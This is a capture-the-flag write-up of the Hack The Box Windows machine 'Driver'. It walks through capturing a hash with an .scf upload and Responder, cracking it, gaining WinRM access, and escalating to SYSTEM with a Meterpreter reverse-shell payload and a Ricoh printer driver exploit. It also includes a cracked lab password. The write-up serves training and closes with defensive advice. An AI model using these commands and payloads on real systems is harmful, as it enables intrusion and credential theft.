---
title: "HTB - Driver"
author: "M0k4"
date: "2026-05-06"
tags: ["htb", "writeup", "windows", "easy", "responder", "winrm", "metasploit"]
---

# HTB - Driver

**IP Address:** `10.129.29.215`  
**OS:** Windows (IIS / SMB / WinRM)  
**Difficulty:** Easy  
**Tags:** #Windows #IIS #SMB #WinRM #Responder #Metasploit #Printer

---
## Synopsis

The target exposes a PHP-backed IIS site on port 80 behind HTTP Basic authentication, plus SMB on 445 and WinRM on 5985 (hostname `DRIVER`). After authenticating to the web UI, the firmware upload workflow places files where an internal reviewer can open them; uploading a crafted `.scf` that references a UNC path on the attacker host causes an outbound SMB authentication that Responder records as NetNTLMv2 for `DRIVER\tony`. Offline cracking yields credentials usable over WinRM. From that shell, enumeration highlights a Ricoh Universal PCL6 driver and a running Print Spooler; a Meterpreter session plus Metasploit’s `exploit/windows/local/ricoh_driver_privesc` yields `NT AUTHORITY\SYSTEM`, where `root.txt` is recovered.

---
## Skills Required

- TCP port scanning and service identification (`nmap`)
- IIS/HTTP enumeration and HTTP Basic authentication
- SMB-related credential capture (Responder) and offline hash cracking (`john`)
- Windows remote shells (WinRM / Evil-WinRM)
- Meterpreter staging and Metasploit local exploits

## Skills Learned

- Turning “manual review” file-share workflows into coerced outbound authentication for NetNTLMv2 capture
- Correlating PowerShell history and registry evidence for installed printer drivers before local exploitation
- Using session migration for reliable Metasploit post-exploitation against the print subsystem

---
## 1. Initial Enumeration

### 1.1 Connectivity Test

Check if the host is alive using ICMP:

```bash
ping -c 1 10.129.29.215
```

![ping](driver_01_ping.png)

---
### 1.2 Port Scanning

Scan all TCP ports to identify open services:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.29.215 -oG allPorts
```

- `-p-` : Scan all 65,535 ports  
- `--open` : Show only open ports  
- `-sS` : SYN scan (stealthy and fast)  
- `--min-rate 5000` : Increase scan speed  
- `-Pn` : Skip host discovery  
- `-oG` : Output in grepable format  

![allports](driver_02_nmap_allports.png)

Extract the open ports:

```bash
extractPorts allPorts
```

![extractports](driver_03_extractports.png)

---
### 1.3 Targeted Scan

Run a deeper scan on the identified ports with version detection and default scripts:

```bash
nmap -sCV -p80,135,445,5985 10.129.29.215 -oN targeted
cat targeted
```

- `-sC` : Run default NSE scripts  
- `-sV` : Detect service versions  
- `-oN` : Output in human-readable format  

![targeted 1](driver_04_nmap_targeted_1.png)
![targeted 2](driver_05_nmap_targeted_2.png)

**Findings:**

| Port(s) | Service | Notes |
|---|---|---|
| 80/tcp | http (Microsoft IIS 10.0) | Basic auth realm references “MFP Firmware Update Center” (admin) |
| 135/tcp | msrpc | Windows RPC |
| 445/tcp | microsoft-ds | SMB; workgroup `WORKGROUP` |
| 5985/tcp | wsman / HTTPAPI | WinRM over HTTP |

---
## 2. Service Enumeration

### 2.1 HTTP / IIS enumeration (unauthenticated)

The web root requires Basic authentication; fingerprint the stack and confirm the authentication challenge before attempting credentials.

```bash
whatweb http://10.129.29.215
curl http://10.129.29.215
curl -I http://10.129.29.215
```

![whatweb and curl](driver_06_whatweb_curl.png)

### 2.2 Authenticated web surface (MFP portal)

After Basic authentication, open the main site in the browser to confirm the expected portal content and navigation (Firmware Updates, etc.).

```text
URL: http://10.129.29.215/index.php
```

![web home](driver_08_web_home.png)

### 2.3 SMB share listing attempts

Anonymous listing and reuse of the web Basic credentials were tested against SMB to see if share enumeration was immediately available.

```bash
smbclient -N -L //10.129.29.215
smbclient -L //10.129.29.215 -U 'admin%admin'
```

![smbclient failures](driver_07_smbclient_failures.png)

---
## 3. Foothold

### 3.1 Coerced NetNTLMv2 capture via `.scf` upload

The firmware upload workflow states files are reviewed internally. A common way to abuse that behavior is to upload a `.scf` that references a UNC path on the attacker host, while running Responder on the VPN interface.

Create the `.scf` payload (example `IconFile` points at the attacker VPN IP from this run):

```bash
sudo nano probe.scf
cat probe.scf
```

![probe.scf contents](driver_09_probe_scf.png)

Start Responder on `tun0` and submit the upload through the web form:

```bash
sudo responder -I tun0 -w
```

![firmware upload and Responder listener](driver_10_fw_up_responder.png)

When the victim account authenticates outbound, NetNTLMv2 material is captured:

```text
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:<redacted>
```

![Responder captured hash](driver_11_responder_hash.png)

### 3.2 Offline cracking and WinRM access

Save the captured hash to a file and crack it offline, then authenticate to WinRM.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt tony.ntlmv2
```

![john cracked password](driver_12_john_crack.png)

**Recovered (redact before publishing):** `tony:liltony` (from the notes capture/crack flow)

```bash
evil-winrm -i 10.129.29.215 -u 'tony' -p 'liltony'
```

![evil-winrm session and user flag](driver_13_evil_winrm_user_flag.png)

🏁 **User flag obtained**

---
## 4. Privilege Escalation

### 4.1 Local enumeration: privileges and PowerShell history

From the WinRM shell, review token privileges and recent PowerShell activity for hints about printers/drivers.

```powershell
whoami /priv
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue | Select-Object -Last 50
```

![privileges and printer history hint](driver_14_privesc_enum_history.png)

### 4.2 Installed Ricoh printer driver (registry)

The lab notes confirm the Ricoh driver key exists under the x64 Version-3 driver store path. Validate on-box with:

```powershell
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Drivers" /s | findstr /i "ricoh pcl6 universal"
```

_No screenshot was captured for this registry query in the provided evidence set; see the screenshots index checklist if you want to add one._

### 4.3 Meterpreter staging + Ricoh driver local exploit

Generate a staged payload, upload it to a writable folder, and catch a Meterpreter session. With a live session, run the Ricoh printer driver local exploit module (this solve used Metasploit `exploit/windows/local/ricoh_driver_privesc`).

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.206 LPORT=4444 -f exe -o shell.exe
```

![msfvenom shell.exe](driver_15_msfvenom.png)

```powershell
cd C:\Temp
mkdir Privesc
cd .\Privesc
upload shell.exe shell.exe
.\shell.exe
```

![upload and execute meterpreter staging binary](driver_16_upload_shell.png)

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.15.206
set LPORT 4444
set ExitOnSession false
run -j
sessions -i 1
getuid
background
use exploit/windows/local/ricoh_driver_privesc
set SESSION 1
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.15.206
set LPORT 4446
run
```

![meterpreter handler and ricoh privesc success](driver_17_meterpreter_handler.png)
![ricoh driver privesc module output](driver_18_ricoh_privesc.png)

### 4.4 SYSTEM proof: `root.txt`

Open a shell in the elevated session and read the administrator flag:

```text
shell
whoami
cd ../../Users/Administrator/Desktop
dir root.txt
type root.txt
```

![root flag](driver_19_root_flag.png)

🏁 **Root flag obtained**

---
# ✅ MACHINE COMPLETE

---
## Summary of Exploitation Path

1. Enumerate open ports and identify IIS + SMB + WinRM on Windows host `DRIVER`.
2. Access the IIS “MFP Firmware Update Center” portal and use the firmware upload workflow.
3. Upload a `.scf` that forces an outbound SMB authentication to the attacker while Responder captures NetNTLMv2 for `DRIVER\tony`.
4. Crack `tony`’s NetNTLMv2 offline and obtain remote access via WinRM / Evil-WinRM; collect `user.txt`.
5. Stage Meterpreter and exploit the installed Ricoh Universal PCL6 driver via Metasploit local module to gain `NT AUTHORITY\SYSTEM`.

---
## Defensive Recommendations

- Do not rely on “manual review” of untrusted uploads from semi-trusted workflows without strict file-type controls and sandboxing; block dangerous file types from being opened by interactive users.
- Enforce SMB signing where possible and restrict outbound UNC resolution for unprivileged users/workflows.
- Reduce local attack surface around third-party printer drivers: patch/remove vulnerable driver packages, restrict write permissions under driver installation paths, and monitor print-spooler abuse patterns.
- Avoid weak or default web credentials; prefer integrated auth or secrets management rather than guessable Basic Auth for internal apps.
